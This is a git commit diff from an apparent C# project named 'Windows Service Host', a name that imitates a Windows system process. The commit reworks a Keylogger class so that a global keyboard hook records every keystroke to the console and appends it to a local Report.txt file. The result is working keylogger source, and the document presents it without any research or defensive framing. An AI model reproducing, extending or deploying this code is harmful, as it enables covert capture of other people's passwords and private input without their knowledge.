d3110631bbb41a8d0be6fd20b8796f4fb0d903a8
Nayil <n.arana1@outlook.com>
2019-01-15 20:41:16 -0500

    Added ability to write to text file

--- Windows Service Host/Program.cs
+++ Windows Service Host/Program.cs
@@ -18,68 +18,41 @@ namespace Windows_Service_Host
 {
     class Keylogger
     {
-        // getMonth takes an int between 1 and 12 and returns the string corresponding to the correct month.
-        public static string getMonth(int month)
-        {
-            string strMonth = "Unknown";
-            switch (month)
-            {
-                case 1:
-                    strMonth = "January";
-                    break;
-                case 2:
-                    strMonth = "February";
-                    break;
-                case 3:
-                    strMonth = "March";
-                    break;
-                case 4:
-                    strMonth = "April";
-                    break;
-                case 5:
-                    strMonth = "May";
-                    break;
-                case 6:
-                    strMonth = "June";
-                    break;
-                case 7:
-                    strMonth = "July";
-                    break;
-                case 8:
-                    strMonth = "August";
-                    break;
-                case 9:
-                    strMonth = "September";
-                    break;
-                case 10:
-                    strMonth = "October";
-                    break;
-                case 11:
-                    strMonth = "November";
-                    break;
-                case 12:
-                    strMonth = "December";
-                    break;
-            }
-            return strMonth;
-        }
 
+
+        public static void createFile()
+        {
+            using (FileStream fs = File.Create("Report.txt"))
+            {
+                //Byte[] info = new UTF8Encoding(true).GetBytes("");
+                //fs.Write(info, 0, info.Length);
+            }
+        }
+        
         // The main method displays the date and outputs any keystrokes typed while the program is opened.
         // side effects: console output
         static void Main(string[] args)
         {
             using (var api = new KeystrokeAPI())
             {
-                int year = DateTime.Now.Year;
-                int month_raw = DateTime.Now.Month;
-                string month = getMonth(month_raw);
-                int day = DateTime.Now.Day;
-                Console.Write("Keylogger Report for ");
-                Console.WriteLine(day + " " + month + " " + year);
-                
-                api.CreateKeyboardHook((character) => {Console.Write(character);});
+                if (!File.Exists("Report.txt"))
+                {
+                    createFile();
+                }
+                StreamWriter report = new StreamWriter("Report.txt", append: true);
+                report.AutoFlush = true;
+                using (report)
+                {
+                    api.CreateKeyboardHook((character) =>
+                    {
+                        Console.Write(character);
+                        report.Write(character);
+                    });
+
                 Application.Run();
+                }
             }
         }
+
     }
 }
